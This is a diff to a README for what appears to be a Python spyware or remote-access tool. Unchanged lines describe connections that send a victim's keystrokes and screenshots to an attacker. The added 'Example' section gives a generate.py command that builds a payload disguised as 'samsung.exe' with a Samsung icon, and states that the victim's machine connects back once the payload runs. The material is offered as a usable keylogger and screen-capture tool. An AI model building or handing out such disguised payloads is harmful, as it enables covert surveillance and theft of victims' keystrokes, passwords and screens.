@@ -43,6 +43,15 @@ Feedbacks(specially bads ones) are appreciated :)
 - The second connection, to port 5001, is called the "key connection"(no pun intented). This connection is used to send the victim's keystrokes back the attacker. The first increment from _MAIN PORT_, in this case 5000, is used for the "key connection"
 - The third one, to port 5002, is only initiated when the attacker uses the "active/main connection" to send the _screenshot_ command, see [_commands.md_](https://github.com/Theguydev/Spython/blob/main/commands.md)
 - Once the connection is established, the image of the victim's screen is sent to the attacker and stored in a file(which is specified by the user). After the data is sent, the victim closes the connection and the attacker continues listening for inbound connnection on the very same port. Note that the second increment from _MAIN PORT_, in this case 5002, is used for the third connection(the dashed line on the diagram). No name for this connection yet
+## Example ##
+![image](https://user-images.githubusercontent.com/91953982/198356174-05291422-f6f9-482f-8632-213ef01af8ce.png)
+- `Host` defaults to *127.0.0.*
+- `Main port` defaults to 5000
+- Using the command, you will get an executable named samumg.exe. For this demo i created s shortcut to the windows desktop
+-     python generate.py -H 192.168.100.115 -N samsung.exe -i=logos/samsung.ico
+![image](https://user-images.githubusercontent.com/91953982/198357623-35133f42-1c8b-4ce2-a6af-55f9f787cae6.png)
+- Upon executing the payload, the victim connects to the attackers machine and this is what the attacker sees
+
 
 ## Drawback ##
 - To obtain an exe executable, you will have to be in a windows machine(VM works fine). This applies to Linux and Mac
